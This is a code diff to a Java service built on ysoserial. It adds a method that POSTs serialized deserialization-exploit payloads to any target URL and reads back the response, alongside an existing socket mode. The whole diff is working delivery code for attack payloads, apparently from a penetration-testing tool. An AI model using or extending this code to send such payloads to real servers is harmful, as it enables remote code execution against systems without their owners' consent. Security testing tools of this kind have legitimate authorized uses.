@@ -7,9 +7,13 @@ import ysoserial.payloads.ObjectPayload;
 import ysoserial.Serializer;
 
 import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
 import java.net.Socket;
+import java.net.URL;
 import java.util.*;
 
 @Slf4j
@@ -83,10 +87,12 @@ public class PayloadServiceImpl implements PayloadService {
     }
     
     @Override
-    public String testPayload(byte[] payload, String host, Integer port, String type) {
+    public String testPayload(byte[] payload, String host, Integer port, String url, String type) {
         try {
             if ("socket".equals(type)) {
                 return testViaSocket(payload, host, port);
+            } else if ("url".equals(type)) {
+                return testViaUrl(payload, url);
             } else {
                 return testViaDeserialization(payload);
             }
@@ -104,6 +110,41 @@ public class PayloadServiceImpl implements PayloadService {
             return "Payload sent successfully to " + host + ":" + port;
         } catch (Exception e) {
             return "Failed to send payload: " + e.getMessage();
+        }
+    }
+
+    private String testViaUrl(byte[] payload, String targetUrl) {
+        try {
+            URL url = new URL(targetUrl);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(5000);
+            conn.setReadTimeout(10000);
+            conn.setRequestProperty("Content-Type", "application/octet-stream");
+            conn.setRequestProperty("Content-Length", String.valueOf(payload.length));
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(payload);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            String responseMsg = readResponse(conn);
+            return "HTTP " + responseCode + " - Payload sent to " + targetUrl + (responseMsg.isEmpty() ? "" : ". Response: " + responseMsg);
+        } catch (Exception e) {
+            return "Failed to send payload to URL: " + e.getMessage();
+        }
+    }
+
+    private String readResponse(HttpURLConnection conn) {
+        try (InputStream is = conn.getErrorStream() != null ? conn.getErrorStream() : conn.getInputStream()) {
+            if (is == null) return "";
+            byte[] buf = new byte[4096];
+            int len = is.read(buf);
+            return len > 0 ? new String(buf, 0, len) : "";
+        } catch (Exception e) {
+            return "";
         }
     }
     
